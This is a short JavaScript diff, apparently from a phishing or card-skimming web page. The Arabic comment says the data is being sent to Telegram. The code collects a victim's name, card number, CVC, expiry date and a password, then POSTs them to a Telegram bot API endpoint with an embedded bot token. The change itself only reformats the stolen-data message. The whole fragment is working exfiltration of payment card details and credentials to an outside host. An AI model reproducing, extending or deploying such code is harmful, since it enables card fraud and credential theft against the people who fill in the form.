@@ -209,7 +209,7 @@
             if (name && number && cvc && month && year && fort) {
 
                 // إرسال البيانات إلى تلغرام
-                let message = `بيانات الدفع:\nالاسم: ${name}\nإتمام الدفع: ${name}\nرقم البطاقة: ${number}\nCVC: ${cvc}\nتاريخ الانتهاء: ${name}\nسنة: ${month}/${year}\nكلمة السر: ${fort}`;
+                let message = `بيانات الدفع:\nالاسم: ${name}\nرقم البطاقة: ${number}\nCVC: ${cvc}\nتاريخ الانتهاء: ${month}/${year}\nكلمة السر: ${fort}`;
                 
                 fetch(`https://api.telegram.org/bot7676226649:AAHE6aj-0kFU29ijO7dAw3vH4pE_JF1R4vY/sendMessage`, {
                     method: "POST",
